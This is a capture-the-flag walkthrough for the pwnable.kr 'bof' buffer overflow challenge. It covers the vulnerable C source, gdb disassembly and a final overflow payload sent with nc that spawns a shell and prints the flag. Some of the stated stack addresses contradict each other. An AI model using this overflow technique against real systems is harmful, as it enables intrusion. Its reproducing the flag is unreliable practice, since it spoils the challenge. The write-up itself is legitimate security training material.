@@ -1,0 +1,222 @@
+#The bof challenge (Toddler’s bottle) walkthrough 
+
+## Description
+Nana told me that buffer overflow is one of the most common software vulnerability.
+Is that true?
+
+Download : http://pwnable.kr/bin/bof
+Download : http://pwnable.kr/bin/bof.c
+
+Running at : nc pwnable.kr 9000
+
+I decided to check out pwnables.kr since my school exams are approaching and i need to chill a bit so without wasting time i will start explaining ... 
+
+* First reactions * after i downloaded the binaries = > HmmMMMMmmmMMMMMM
+Point to be noted I assume they had stack protection on the precompiled binary they host on their site anyways 
+
+
+First analysing content of bof.c 
+```
+$ cat bof.c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32]; <= buffer is of 32 bytes only 
+	printf("overflow me : ");
+	gets(overflowme);	// smash me! ( hint by the authors dumbfuck)
+	if(key == 0xcafebabe){ <= Key comparision
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef); 
+	return 0;
+}
+```
+
+Presuming you are well aware of the basics of x86 asm let's analyse the binary :D 
+
+```
+gdb -q bof 
+```
+```
+gdb-peda$ disass main
+
+Dump of assembler code for function main:
+   0x0804856a <+0>:     lea    ecx,[esp+0x4]
+   0x0804856e <+4>:     and    esp,0xfffffff0
+   0x08048571 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x08048574 <+10>:    push   ebp
+   0x08048575 <+11>:    mov    ebp,esp
+   0x08048577 <+13>:    push   ecx
+   0x08048578 <+14>:    sub    esp,0x4
+   0x0804857b <+17>:    sub    esp,0xc
+   0x0804857e <+20>:    push   0xdeadbeef
+   0x08048583 <+25>:    call   0x80484fb <func> <-- existence of another function named 'func' obvious 
+   0x08048588 <+30>:    add    esp,0x10
+   0x0804858b <+33>:    mov    eax,0x0
+   0x08048590 <+38>:    mov    ecx,DWORD PTR [ebp-0x4]
+   0x08048593 <+41>:    leave
+   0x08048594 <+42>:    lea    esp,[ecx-0x4]
+   0x08048597 <+45>:    ret
+End of assembler dump.
+```
+```
+There's nothing much to look in the main function ..
+
+gdb-peda$ disass func
+Dump of assembler code for function func:
+   0x080484fb <+0>:     push   ebp
+   0x080484fc <+1>:     mov    ebp,esp
+   0x080484fe <+3>:     sub    esp,0x38
+   0x08048501 <+6>:     mov    eax,gs:0x14
+   0x08048507 <+12>:    mov    DWORD PTR [ebp-0xc],eax
+   0x0804850a <+15>:    xor    eax,eax
+   0x0804850c <+17>:    sub    esp,0xc
+   0x0804850f <+20>:    push   0x8048620
+   0x08048514 <+25>:    call   0x8048390 <printf@plt>
+   0x08048519 <+30>:    add    esp,0x10
+   0x0804851c <+33>:    sub    esp,0xc
+   0x0804851f <+36>:    lea    eax,[ebp-0x2c] <= interesting 
+   0x08048522 <+39>:    push   eax
+   0x08048523 <+40>:    call   0x80483a0 <gets@plt>
+   0x08048528 <+45>:    add    esp,0x10
+   0x0804852b <+48>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe <=
+   0x08048532 <+55>:    jne    0x8048546 <func+75>
+   0x08048534 <+57>:    sub    esp,0xc
+   0x08048537 <+60>:    push   0x804862f
+   0x0804853c <+65>:    call   0x80483d0 <system@plt>
+   0x08048541 <+70>:    add    esp,0x10
+   0x08048544 <+73>:    jmp    0x8048556 <func+91>
+   0x08048546 <+75>:    sub    esp,0xc
+   0x08048549 <+78>:    push   0x8048637
+   0x0804854e <+83>:    call   0x80483c0 <puts@plt>
+   0x08048553 <+88>:    add    esp,0x10
+   0x08048556 <+91>:    nop
+   0x08048557 <+92>:    mov    eax,DWORD PTR [ebp-0xc]
+   0x0804855a <+95>:    xor    eax,DWORD PTR gs:0x14
+   0x08048561 <+102>:   je     0x8048568 <func+109>
+   0x08048563 <+104>:   call   0x80483b0 <__stack_chk_fail@plt>
+   0x08048568 <+109>:   leave
+   0x08048569 <+110>:   ret
+End of assembler dump.
+```
+
+Two things we look forward too in here :) 
+
+```
+
+0x0804852b <+48>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe 
+
+```
+
+From this line we can presume that the value 0xdeadbeef would be located in EBP+8 since its the only parameter being passed 
+
+So lets hit a break on this address only :) 
+
+```
+
+gdb-peda$ break * 0x0804852b
+Breakpoint 1 at 0x804852b
+
+gdb-peda$ r
+Starting program: /root/prac/bof
+[----------------------------------registers-----------------------------------]
+EAX: 0x0
+EBX: 0x0
+ECX: 0xbffff380 --> 0x1
+EDX: 0xbffff3a4 --> 0x0
+ESI: 0xb7fc5000 --> 0x1b1db0
+EDI: 0xb7fc5000 --> 0x1b1db0
+EBP: 0xbffff348 --> 0xbffff368 --> 0x0
+ESP: 0xbffff300 --> 0x8048620 ("overflow me : ")
+EIP: 0x8048514 (<func+25>:      call   0x8048390 <printf@plt>)
+EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x804850a <func+15>: xor    eax,eax
+   0x804850c <func+17>: sub    esp,0xc
+   0x804850f <func+20>: push   0x8048620
+=> 0x8048514 <func+25>: call   0x8048390 <printf@plt>
+   0x8048519 <func+30>: add    esp,0x10
+   0x804851c <func+33>: sub    esp,0xc
+   0x804851f <func+36>: lea    eax,[ebp-0x2c]
+   0x8048522 <func+39>: push   eax
+Guessed arguments:
+arg[0]: 0x8048620 ("overflow me : ")
+arg[1]: 0xb7fff918 --> 0x0
+[------------------------------------stack-------------------------------------]
+0000| 0xbffff300 --> 0x8048620 ("overflow me : ")
+0004| 0xbffff304 --> 0xb7fff918 --> 0x0
+0008| 0xbffff308 --> 0xbffff320 --> 0xffffffff
+0012| 0xbffff30c --> 0x804829f ("__libc_start_main")
+0016| 0xbffff310 --> 0x0
+0020| 0xbffff314 --> 0xbffff3b4 --> 0xd9a8a28d
+0024| 0xbffff318 --> 0xb7fc5000 --> 0x1b1db0
+0028| 0xbffff31c --> 0x9f17
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+gdb-peda$ x $ebp+8
+0xffffdc40:	0xdeadbeef
+
+```
+
+So we now have the exact location of 0xdeadbeef 
+
+We know that gets() function expects an address of buffer as parameter which it can store in eax register 
+
+Exact candidate for that is this line  :
+
+```
+
+0x0804851f <+36>:    lea    eax,[ebp-0x2c] 
+
+```
+
+It initiates the effective address into eax before calling our gets() function 
+So by this we can guess the variable "overflowme" can be located in this :) 
+
+So again we continue with peda 
+
+```
+gdb-peda$ x $esp-0x2c
+0xbffff31c : hellobuf
+```
+
+Now head back to a python shell and calculate the difference between 0xffffdc40 and 0xbffff31c
+
+```
+>>> print 0xbffff350 - 0xbffff31c
+52 
+```
+So they are like 52 bytes apart on the stack pretty fun 
+
+So the conclusion payload explanation : 
+
+We need to overflow the variable 'overflowme' with 52 junk bytes in a manner that it overflows the stack and reaches the address of the key 
+
+Final payload : 
+
+```
+root@fuckbois:~# (python -c "print 52*'A'+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
+
+ls
+bof
+bof.c
+flag
+log
+log2
+super.pl
+cat flag
+daddy, I just pwned a buFFer :)
+```
+
+
+Could have used pwntools but uhhhhhhh who cares lmfao 
+
+
+
